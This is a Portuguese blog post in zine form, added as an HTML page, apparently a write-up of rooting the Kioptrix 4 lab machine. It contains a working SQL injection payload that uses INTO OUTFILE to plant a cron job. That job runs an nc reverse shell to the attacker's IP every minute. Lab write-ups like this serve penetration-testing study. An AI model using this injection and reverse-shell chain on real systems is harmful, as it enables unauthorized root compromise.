@@ -1,0 +1,56 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Do SQLi ao Root em 2 Passos - OffensiveThink</title>
+  <link rel="stylesheet" href="../assets/zine.css">
+</head>
+<body class="article">
+<main class="page article-page">
+<pre>
+     DO SQLI AO ROOT EM 2 PASSOS
+
+
+        ----------------------------------------------------------------
+        offensive think :: artigo técnico em formato zine / nfo
+        ----------------------------------------------------------------
+
+        titulo : Do SQLi ao Root em 2 Passos
+        autor  : offensive think
+        data   : Thu, Jul 30, 2020
+        tags   : sqli
+
+        ----------------------------------------------------------------
+        --&gt; https://www.offensivethink.com/posts/sqli-to-root.html &lt;--
+
+Tudo começou quando eu vi um Bode e quando esse danado desse bode me levou para uma jaula onde eu quase perco o restante dos cabelos que eu tinha para sair dela. :D :D
+Mas ai eu descobri uma coisa interessante nessa máquina, é que os arquivos que eu conseguia escrever nela através de SQLi ficavam com usuário e grupo root. Esta máquina é a Kioptrix 4.
+Então pensei. O processo do MySQL deve rodar como root e se ele roda como root ele é todo poderoso. Se ele é todo poderoso ele pode escrever onde eu quiser e como quiser. Então , que tal, escrever em um arquivo de crontab um comando para fazer shell reverso pra mim ? Bora tentar assim :
+Vamos tentar criar um arquivo em /etc/cron.d que programe o cron para tentar conectar na nossa máquina a cada 1 minuto:
+
+    */1  * * * *  root  nc.traditional 192.168.200.3 443 -e /bin/bash
+
+Então, nosso SQLi, ficaria assim:
+
+    myusername=john&amp;mypassword=-9334&#x27;OR 1908=1908 limit 0,0 union all 
+    select &quot;*/1 *   * * *&quot; , &quot;root&quot; , &quot;nc.traditional 192.168.200.3 443 -e /bin/bash&quot; 
+    INTO OUTFILE &#x27;/etc/cron.d/crontab&#x27;--%20-
+
+_Tá, não foi assim de primeira , no alvo, prego batido de ponta virada né ? Primeiro apanhei para descobrir que essa danada dessa máquina só tem permissão para se conecta na porta 443 e 22. Depois apanhei tentando fazer com um telnet reverso mas o cron, pelo que entendi abre um subprocesso que morre logo em seguida não permitindo que o telnet fique no ar. Não cheguei a tentar com perl, php, python, etc., pois eu tava decidido a fazer com &quot;comandos do sistema&quot;. Ai no finalzim, vi que o danado tinha o nc.tradicional, ou seja, o nosso net gatinho tradicional._
+Ai agora é injetar via Burp abrir um NC no terminal e aguardar o Shell cair no seu colo:
+Mandando bala
+</pre>
+<a href="#?width=668" target="_blank"><img src="#?width=668"  ></a>
+<a href="#?width=700" target="_blank"><img src="#?width=700"  ></a>
+<pre>
+Recebendo o doce
+E tá ai , rapidinho, nada de restricted shell, nada de escalar privilégios, etc, etc, etc. Direto ao Shell. ;D
+
+---[ EOF ]--------------------------------------------------------------
+
+                    offensive think / 2026
+</pre>
+</main>
+</body>
+</html>
